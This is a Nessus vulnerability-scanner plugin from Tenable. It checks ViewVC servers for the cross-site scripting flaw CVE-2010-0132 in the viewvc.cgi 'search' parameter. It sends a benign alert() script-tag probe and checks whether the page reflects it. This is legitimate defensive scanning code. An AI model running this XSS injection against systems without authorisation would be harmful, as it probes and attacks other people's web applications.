#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(45406);
  script_version("$Revision: 1.8 $");
 script_cvs_date("$Date: 2015/01/15 03:38:17 $");

  script_cve_id("CVE-2010-0132");
  script_bugtraq_id(39053);
  script_osvdb_id(63313);
  script_xref(name:"Secunia", value:"38918");

  script_name(english:"ViewVC viewvc.cgi search Parameter XSS");
  script_summary(english:"Attempts to exploit an XSS flaw in the search parameter of ViewVC");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is vulnerable to a
cross-site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of ViewVC that is affected
by a cross-site scripting vulnerability in the 'search' parameter of
the 'viewvc.cgi' script.

An attacker, exploiting this flaw, could execute arbitrary script code
in a user's browser.

Note that successful exploitation requires the regular expression
search functionality to be enabled.  It is not by default.");
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2010-26/");
    # http://viewvc.tigris.org/source/browse/*checkout*/viewvc/tags/1.1.5/CHANGES
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?70307efb");
    # http://viewvc.tigris.org/source/browse/*checkout*/viewvc/tags/1.0.11/CHANGES
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c30a4650");
  script_set_attribute(attribute:"solution", value:"Upgrade to ViewVC 1.1.5 / 1.0.11 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/04/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:viewvc:viewvc");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("viewvc_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/viewvc");

  exit(0);
}

include("audit.inc");
include("misc_func.inc");
include("global_settings.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(appname:'viewvc', port:port);
if (isnull(install)) exit(0, "ViewVC wasn't detected on port "+port+".");

xss = '">' + "<script>alert('" + SCRIPT_NAME + "-" + unixtime() + "')</script>";
expected_output = '<input type="hidden" name="search" value="'+xss+'"/>';
exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(install['dir']),
  cgi      : "/",
  qs       : "search="+urlencode(str:xss),
  pass_str : expected_output,
  ctrl_re  : 'ViewVC Help</a></strong></td>',
  low_risk : TRUE
);

if (!exploited)
{
  install_url = build_url(qs:install['dir'] + '/', port:port);
  exit(0, "The ViewVC install at " + install_url + " is not affected.");
}
